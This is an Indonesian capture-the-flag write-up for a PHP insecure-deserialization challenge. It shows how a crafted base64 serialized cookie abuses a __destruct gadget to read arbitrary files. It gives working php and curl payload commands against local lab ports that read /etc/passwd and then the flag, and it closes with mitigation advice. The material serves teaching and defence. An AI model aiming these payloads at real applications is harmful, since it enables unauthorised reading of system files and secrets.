# WRITEUP · 06 SaveSlot (SPOILER)

## 1. Amati cookie

Buka halaman, lihat cookie `slot`. Decode base64:

```bash
echo '<nilai-cookie-slot>' | base64 -d
# O:8:"SaveSlot":3:{s:6:"player";s:7:"Pemain1";s:5:"level";i:1;s:5:"score";i:0;}
```

Ini output `serialize()` PHP. Server akan `unserialize()` apa pun yang kita kirim.

## 2. Temukan gadget

Saat `unserialize()`, PHP membuat object dari class yang disebut di data, dan
method ajaib seperti `__destruct()` akan terpanggil. Di sumber aplikasi ada:

```php
class Note {
    public $title = 'catatan';
    public $path  = null;
    public function __destruct() {
        if ($this->path && is_file($this->path)) {
            echo "\n[lampiran: ...]\n" . file_get_contents($this->path);
        }
    }
}
```

Kalau kita kirim object `Note` dengan `path` = lokasi flag, isinya akan dicetak.

## 3. Buat payload

Cara termudah: pakai PHP untuk membuat string serialize-nya. Buktikan dulu gadget
jalan dengan file yang pasti ada (`/etc/passwd`):

```bash
PAY=$(php -r 'class Note{public $title="x";public $path;} $n=new Note(); $n->path="/etc/passwd"; echo base64_encode(serialize($n));')
curl -s -b "slot=$PAY" http://127.0.0.1:9006/ | tail
# isi /etc/passwd ikut tercetak -> gadget bekerja
```

Lalu arahkan ke flag. **Perhatikan**: `__destruct` berjalan saat PHP shutdown,
dan direktori kerjanya berbeda per mode:

```bash
# Lite  -> flag ada di direktori kerja, cukup "user.txt"
PAY=$(php -r 'class Note{public $title="x";public $path;} $n=new Note(); $n->path="user.txt"; echo base64_encode(serialize($n));')
curl -s -b "slot=$PAY" http://127.0.0.1:9006/ | grep -o 'FLAG{[^}]*}'

# Docker -> pakai path absolut
PAY=$(php -r 'class Note{public $title="x";public $path;} $n=new Note(); $n->path="/var/www/user.txt"; echo base64_encode(serialize($n));')
curl -s -b "slot=$PAY" http://127.0.0.1:8006/ | grep -o 'FLAG{[^}]*}'
```

Bentuk serialize manualnya (lite):

```
O:4:"Note":2:{s:5:"title";s:1:"x";s:4:"path";s:8:"user.txt";}
```

> Kalau ragu lokasi flag, baca dulu file yang pasti ada (`/etc/passwd`) untuk
> memastikan gadget jalan, baru cari path flag-nya.

## 4. Pelajaran & mitigasi

- **Jangan `unserialize()` data dari user.** Gunakan format data aman seperti JSON
  (`json_decode`) yang tidak membuat object sembarangan.
- Kalau terpaksa, batasi class yang diizinkan: `unserialize($d, ['allowed_classes' => false])`.
- Waspadai "POP chain": gabungan method ajaib antar-class bisa berujung file write
  / RCE, bukan sekadar baca file.
- Tandatangani data yang dititipkan ke client (HMAC) agar tidak bisa diubah.
